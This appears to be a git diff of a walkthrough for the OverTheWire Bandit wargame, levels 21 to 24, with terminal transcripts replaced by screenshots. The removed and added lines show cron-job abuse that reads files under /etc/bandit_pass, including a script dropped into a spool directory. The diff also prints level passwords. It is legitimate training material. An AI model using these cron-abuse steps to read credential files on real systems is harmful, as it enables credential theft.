@@ -684,8 +684,6 @@ bandit20@bandit.labs.overthewire.org's password: GbKksEFF4yrVs6il55v6gwY5aVje5f0
 
 ![image](https://user-images.githubusercontent.com/96256687/147856370-1288b517-aefc-4394-81a8-e9ad6bdf5441.png)
 
-
-
 #Execution option 2
 
 ![image](https://user-images.githubusercontent.com/96256687/147856489-c1ec4c66-21d8-4e22-8db1-eaf24f5850d5.png)
@@ -712,26 +710,8 @@ Solution of level 21 -> 22
 
 bandit21@bandit.labs.overthewire.org's password: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
 
-bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
-@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
-* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+![image](https://user-images.githubusercontent.com/96256687/147883177-a994ceb4-7bb5-4494-9c46-d01b2b83e549.png)
 
-bandit21@bandit:~$ cd /etc/cron.d/
-bandit21@bandit:/etc/cron.d$ ls -l
-total 24
--rw-r--r-- 1 root root  62 May 14 13:40 cronjob_bandit15_root
--rw-r--r-- 1 root root  62 Jul 11 15:56 cronjob_bandit17_root
--rw-r--r-- 1 root root 120 May  7 20:14 cronjob_bandit22
--rw-r--r-- 1 root root 122 May  7 20:14 cronjob_bandit23
--rw-r--r-- 1 root root 120 May 14 09:41 cronjob_bandit24
--rw-r--r-- 1 root root  62 May 14 14:04 cronjob_bandit25_root
-
-bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh 
-#!/bin/bash
-chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
-cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
-
-bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
 ********************************
 
@@ -760,23 +740,8 @@ Solution of level 22 -> 23
 
 bandit22@bandit.labs.overthewire.org's password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
 
-bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
-@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null                                     
-* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null                                   
-bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
-#!/bin/bash                                                                                     
-                                                                                                
-myname=$(whoami)                                                                                
-mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)                                   
-                                                                                                
-echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"                          
-                                                                                                
-cat /etc/bandit_pass/$myname > /tmp/$mytarget 
+![image](https://user-images.githubusercontent.com/96256687/147883812-35385332-cdb7-4f21-ac40-f6fb7064b181.png)
 
-bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
-8ca319486bfbbc3663ea0fbe81326349
-
-bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 ********************************
 
@@ -805,76 +770,20 @@ Solution of level 23 -> 24
 
 bandit23@bandit.labs.overthewire.org''s password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 
-bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
-@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
-* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+![image](https://user-images.githubusercontent.com/96256687/147884295-2ca9bff3-91c8-4c97-bc42-fd0dc4a58f3a.png)
 
-bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+![image](https://user-images.githubusercontent.com/96256687/147884324-7a5c9ccf-d61b-4d83-b2bb-de880bf6bf82.png)
+
+-----------------------------------------------------
 #!/bin/bash
 
-myname=$(whoami)
+cat /etc/bandit_pass/bandit24 > /tmp/secttp/password2
+------------------------------------------------------
 
-cd /var/spool/$myname
-echo "Executing and deleting all scripts in /var/spool/$myname:"
-for i in * .*;
-do
-    if [ "$i" != "." -a "$i" != ".." ];
-    then
-        echo "Handling $i"
-        owner="$(stat --format "%U" ./$i)"
-        if [ "${owner}" = "bandit23" ]; then
-            timeout -s 9 60 ./$i
-        fi
-        rm -f ./$i
-    fi
-done
+![image](https://user-images.githubusercontent.com/96256687/147884361-79eefb81-8d5b-46b8-bd8d-ceaa182d04ee.png)
 
+![image](https://user-images.githubusercontent.com/96256687/147884396-57dae547-6607-49c1-9414-f04559e0484a.png)
 
-bandit23@bandit:~$ mkdir -p /tmp/secttp
-bandit23@bandit:~$ cd /tmp/secttp
-bandit23@bandit:/tmp/secttp$ ls -l
-total 52
--rw-r--r-- 1 bandit23 root    4 Sep 24 15:03 myname
--rw-rw-rw- 1 bandit23 root    0 Sep 20 22:37 pas
--rw-rw-rw- 1 bandit23 root   33 Sep 20 16:09 passs
--rw-rw-rw- 1 bandit23 root   33 Sep 25 16:20 password
--rw-r--r-- 1 bandit23 root 4435 Sep 19 00:14 pincode.py
--rw-r--r-- 1 bandit23 root 4415 Sep 19 00:15 pinsa.py
--rw-r--r-- 1 bandit23 root    0 Sep 17 12:30 ppassword
--rwxrwxrwx 1 bandit23 root   64 Sep 20 16:06 p.sh
--rw-r--r-- 1 bandit23 root   66 Sep 24 15:09 secctp.sh
--rwxr-xr-x 1 bandit23 root   54 Sep 20 05:13 sectp.sh
--rw-r--r-- 1 bandit23 root    2 Sep 24 15:06 secttp
--rwxrwxrwx 1 bandit23 root   66 Sep 25 13:35 secttp.sh
--rw-r--r-- 1 bandit23 root    2 Sep 24 15:02 whoami
-
-bandit23@bandit:/tmp/secttp$ touch secttp.sh
-bandit23@bandit:/tmp/secttp$ chmod 777 secttp.sh
-bandit23@bandit:/tmp/secttp$ ls -al secttp.sh
--rwxrwxrwx 1 bandit23 root 66 Sep 26 18:52 secttp.sh
-
-andit23@bandit:/tmp/secttp$ nano secttp.sh 
-Unable to create directory /home/bandit23/.nano: Permission denied
-It is required for saving/loading search history or cursor positions.
-
-Press Enter to continue
-
-#!/bin/bash
-
-cat /etc/bandit_pass/bandit24 > /tmp/secttp/password
-
-
-bandit23@bandit:/tmp/secttp$ touch password 
-bandit23@bandit:/tmp/secttp$ chmod 666 password 
-bandit23@bandit:/tmp/secttp$ ls -la password 
--rw-rw-rw- 1 bandit23 root 33 Sep 26 18:57 password
-
-bandit23@bandit:/tmp/secttp$ cp secttp.sh /var/spool/bandit24/
-bandit23@bandit:/tmp/secttp$ ls -al /var/spool/bandit24/secttp.sh
--rwxr-xr-x 1 bandit23 bandit23 66 Sep 26 18:59 /var/spool/bandit24/secttp.sh
-bandit23@bandit:/tmp/secttp$ ls -al password
--rw-rw-rw- 1 bandit23 root 33 Sep 26 18:57 password
-bandit23@bandit:/tmp/secttp$ cat password
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ********************************
 
